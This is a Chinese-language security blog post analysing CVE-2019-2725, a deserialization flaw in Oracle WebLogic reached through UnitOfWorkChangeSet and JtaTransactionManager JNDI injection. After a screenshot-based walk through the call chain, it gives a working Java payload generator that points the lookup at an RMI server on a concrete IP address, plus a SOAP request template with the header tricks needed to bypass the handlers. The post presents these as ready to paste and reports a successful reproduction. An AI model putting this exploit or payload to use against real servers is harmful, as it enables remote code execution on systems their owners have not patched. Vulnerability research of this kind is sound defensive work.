# # CVE-2019-2725 二次反序列化jndi注入分析 - Afant1 - 博客园

> 原文：[https://www.cnblogs.com/afanti/p/10802022.html](https://www.cnblogs.com/afanti/p/10802022.html)

## 前言

这个漏洞现在绕过补丁的poc，我知道有三种, 这篇文章主要分析第二个poc：

1.  [UnitOfWorkChangeSet二次反序列化通过7u21 gadget触发rce](https://www.t00ls.net/thread-51008-1-1.html)
2.  UnitOfWorkChangeSet二次反序列化通过JtaTransactionManager实现jndi注入
3.  FileSystemXmlApplicationContext 这个类实现RCE
    其中exp影响也是递增的

*   第一个Poc只能用于10.3.6版本（服务器环境必须是7u21）。
*   第二个poc能用于10.3.6，(jdk版本在1.8版本以下)。
*   第三个poc则可通杀10.3.6和12.1.3版本（jdk版本不受限制）这个poc就不放出了:)

## 漏洞分析

这个UnitOfWorkChangeSet类的构造函数传入byte，然后进行二次反序列化，漏洞代码位置如下
![Alt text](../Images/5a5f24e759fb10b907c68ad41c274a40.png)
ServerAddressingHandler和AsyncResponseHandler需要将poc设置addressing.RelatesTo和addressing.Action才能绕过，到WorkAreaServerHandler来处理，漏洞触发点也是在这个Handler,跟进去看一下。
![Alt text](../Images/2290fda4f6d6f9565793747080073dd9.png)
跟进handleRequest方法，传入构造好的poc，交给WorkContextXmlInputAdapter方法处理
![Alt text](../Images/9855563151ef27b8e34cd88bb8ec4a2d.png)
跟进去，来到了漏洞触发点，看一下调用栈。
![Alt text](../Images/2bce8c2f8922ec529f358b49ee3def6d.png)
漏洞跟到了UnitOfWorkChangeSet这个类，传入JtaTransactionManager这个类的bytes,执行这个类的readObject方法，跟进去。
![Alt text](../Images/f750d7e7c8c1917906b5663c491d453b.png)
调用了initUserTransactionAndTransactionManager方法，继续跟。
![Alt text](../Images/32018c54e3535fe102fc34a314fd754e.png)
userTransactionName的值是我们poc中的恶意的rmi地址
![Alt text](../Images/cbab3938ffded2515f17c6bd7196e682.png)
继续跟的话，在这里调用lookup方法
![Alt text](../Images/8dac213cfb33f45a7b8fc185f81ca562.png)
最终导致RCE
![Alt text](../Images/a3420ba122f7a2d5584cdbcc94b90fc9.png)

## POC构造

给位看官看到这里可能已经不耐烦了，还不给poc吗？？？
command为rmi构造的RCE的命令，这里不用赘述，懂的人自然知道怎么构造。
POC如下：

```
public class exp
{
    public static void main( String[] args ) throws Exception {
        String command ="rmi://121.195.170.127:9999/aa";
        JtaTransactionManager jtaTransactionManager = new JtaTransactionManager();
        byte[] bytes = ObjectToByte(jtaTransactionManager);

        objectXmlEncoder(bytes , "payload.xml");
    }
    private static byte[] ObjectToByte(Object obj) {
        byte[] bytes = null;
        try {
            // object to bytearray
            ByteArrayOutputStream bo = new ByteArrayOutputStream();
            ObjectOutputStream oo = new ObjectOutputStream(bo);
            oo.writeObject(obj);

            bytes = bo.toByteArray();

            bo.close();
            oo.close();
        } catch (Exception e) {
            System.out.println("translation" + e.getMessage());
            e.printStackTrace();
        }
        return bytes;
    }

    public static void objectXmlEncoder(Object obj,String fileName)
            throws FileNotFoundException,IOException,Exception
    {

        java.io.File file = new java.io.File(fileName);
        if(!file.exists()){
            file.createNewFile();
        }
        java.io.BufferedOutputStream oop = new java.io.BufferedOutputStream(new java.io.FileOutputStream(file));
        java.beans.XMLEncoder xe = new java.beans.XMLEncoder(oop);
        xe.flush();
        //写入xml
        xe.writeObject(obj);
        xe.close();
        oop.close();
    }
} 
```

将生成的payload.xml内容拷贝到这里就ok了

```
<soapenv:Envelope   >   <soapenv:Header> <wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo> <work:WorkContext >      
<java><class><string>oracle.toplink.internal.sessions.UnitOfWorkChangeSet</string><void>
需要拼接的部分</void></class>
</java>
 </work:WorkContext>
 </soapenv:Header>
 <soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope> 
```

最后看一下复现情况
![Alt text](../Images/ca425a651b16caae9bd806fa4a4ee82e.png)
参考链接：
[廖老板的文章](https://mp.weixin.qq.com/s/tWgRhtFtabL-ceLaRWlY7g)
[畅师傅的文章](https://balis0ng.com/post/lou-dong-fen-xi/weblogic-wls9-asynczu-jian-rcelou-dong-fen-xi)